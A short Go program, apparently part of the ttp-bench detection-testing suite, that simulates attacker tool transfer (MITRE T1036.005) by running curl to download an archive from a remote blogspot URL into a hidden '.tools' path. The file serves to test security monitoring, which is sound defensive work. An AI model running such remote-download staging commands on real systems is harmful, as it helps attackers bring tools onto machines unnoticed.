//go:build !windows

// Simulates tool transfer using curl to a hidden directory [T1036.005]
package main

import (
	"time"

	"github.com/tstromberg/ttp-bench/pkg/iexec"
)

func main() {
	iexec.WithTimeout(30*time.Second, "curl", "-LO", "http://ttp-bench.blogspot.com/home/.tools/archive.tgz")
}
